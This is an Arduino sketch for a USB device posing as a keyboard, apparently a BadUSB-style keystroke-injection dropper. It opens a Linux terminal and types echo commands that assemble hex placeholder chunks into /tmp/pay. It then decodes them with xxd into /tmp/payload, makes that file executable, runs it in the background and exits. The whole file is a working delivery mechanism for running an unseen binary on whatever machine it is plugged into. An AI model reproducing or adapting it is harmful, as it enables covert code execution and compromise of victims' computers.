void setup()
{
  Keyboard.begin();
}

void loop()
{
  delay(5000);
  terminal();
  delay(3000);
  Keyboard.println(F("echo INPUT0 > /tmp/pay"));
  delay(100);
  Keyboard.println(F("echo INPUT1 >> /tmp/pay"));
  delay(100);
  Keyboard.println(F("echo INPUT2 >> /tmp/pay"));
  delay(100);
  Keyboard.println(F("echo INPUT3 >> /tmp/pay"));
  delay(100);
  Keyboard.println(F("echo INPUT4 >> /tmp/pay"));
  delay(100);
  Keyboard.println(F("echo INPUT5 >> /tmp/pay"));
  delay(100);
  Keyboard.println(F("echo INPUT6 >> /tmp/pay"));
  delay(2000);
  Keyboard.println(F("xxd -r -p /tmp/pay /tmp/payload"));
  delay(2000);
  Keyboard.println(F("chmod +x /tmp/payload"));
  Keyboard.println(F("/tmp/payload &"));
  delay(2000);
  Keyboard.println(F("exit"));
  while(true);
}

void terminal()
{
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll(); 
}
